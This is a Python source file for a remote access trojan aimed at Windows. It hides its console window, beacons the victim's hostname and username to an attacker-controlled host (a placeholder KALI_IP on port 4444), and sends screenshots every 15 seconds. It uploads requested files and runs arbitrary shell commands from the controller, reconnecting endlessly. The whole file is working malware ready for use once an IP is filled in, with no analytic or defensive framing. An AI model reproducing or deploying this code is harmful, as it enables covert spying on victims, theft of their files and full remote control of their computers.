import os, time, threading, socket, platform, pyautogui, io, struct, ctypes, subprocess

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

KALI_IP = "KALI_IP"   # ← CHANGE THIS
KALI_PORT = 4444
SCREENSHOT_INTERVAL = 15

def send_screenshot(s):
    try:
        ss = pyautogui.screenshot()
        buf = io.BytesIO()
        ss.save(buf, format="JPEG", quality=20)
        data = buf.getvalue()
        s.send(b'\x02' + struct.pack('>I', len(data)) + data)
    except:
        pass

def auto_screenshot(s):
    while True:
        time.sleep(SCREENSHOT_INTERVAL)
        send_screenshot(s)

def main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((KALI_IP, KALI_PORT))
            s.settimeout(None)
            
            beacon = f"RAT ONLINE - {platform.node()} - {os.getenv('USERNAME')}".encode()
            s.send(b'\x01' + struct.pack('>I', len(beacon)) + beacon)
            
            threading.Thread(target=auto_screenshot, args=(s,), daemon=True).start()
            
            while True:
                length_bytes = s.recv(4)
                if len(length_bytes) != 4:
                    break
                    
                length = struct.unpack('>I', length_bytes)[0]
                cmd = s.recv(length).decode('utf-8', errors='ignore').strip()
                
                if cmd.lower() in ['exit', 'quit']:
                    break
                    
                elif cmd == 'ss':
                    send_screenshot(s)
                    
                elif cmd.startswith('download '):
                    filepath = cmd[9:].strip()
                    try:
                        if os.path.exists(filepath):
                            with open(filepath, "rb") as f:
                                filedata = f.read()
                            s.send(b'\x03' + struct.pack('>I', len(filedata)) + filedata)
                        else:
                            err_msg = f"File not found: {filepath}"
                            s.send(b'\x01' + struct.pack('>I', len(err_msg)) + err_msg.encode())
                    except Exception as e:
                        err = str(e)
                        s.send(b'\x01' + struct.pack('>I', len(err)) + err.encode())
                        
                else:
                    try:
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
                        output = (result.stdout + result.stderr)[:8000]
                        if not output:
                            output = "[+] Command executed (no output)"
                        s.send(b'\x01' + struct.pack('>I', len(output.encode())) + output.encode())
                    except subprocess.TimeoutExpired:
                        err = "[-] Command timed out (20s)"
                        s.send(b'\x01' + struct.pack('>I', len(err)) + err.encode())
                    except Exception as e:
                        err = str(e)
                        s.send(b'\x01' + struct.pack('>I', len(err)) + err.encode())
                        
        except:
            time.sleep(5)
            continue

if __name__ == "__main__":
    main()
